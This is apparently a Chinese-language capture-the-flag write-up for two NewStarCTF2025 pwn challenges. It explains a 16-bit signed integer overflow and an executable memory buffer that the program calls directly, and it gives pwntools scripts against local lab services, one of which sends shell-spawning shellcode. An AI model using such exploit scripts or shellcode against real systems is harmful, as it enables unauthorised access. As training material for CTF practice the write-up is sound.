二.intbug

这个先用指令检查保护等信息，然后拖入ida中。

  1. 进行反编译然后进入func函数中 : 然后进行分析，发现其核心功能是输入数字校验并触发flag读取。
  2. __int16:__int16  是16位有符号整数，它在内存里用 16个二进制位 来存储数据，其中：
  • 最高位（第16位）是符号位： 0  表示正数， 1  表示负数。
    ​
  • 剩下的15位用来存数值的绝对值。

所以它的取值范围是：

  • 最大正数： 0111 1111 1111 1111 （二进制） → 对应十进制 32767
    ​
  • 最小负数： 1000 0000 0000 0000 （二进制） → 对应十进制 -32768。
  1. 当32767加1会进行补码:根据补码原则，这个二进制数代表的十进制值是 -32768。
  2. 然后构建脚本:
    from pwn import *

#r = process(“./ig”)
r=remote(“127.0.0.1”,44519)
r.recvuntil(b”welcome to NewStarCTF2025!\n\n”)

payload = b”1”

for i in range(32767):
r.sendline(payload)
r.interactive()

四. import_function

mmp,申请了内存可读，可写，可执行，且buf指向可执行的内存区，程序还把buf直接当作函数调用，所以用shellcode

  1. 脚本 :
    from pwn import *

context(arch=’amd64’, os=’linux’)

#p = process(‘./if’)
p = remote(“127.0.0.1”, 37521)

payload = asm(shellcraft.sh())

p.send(payload)

p.interactive()
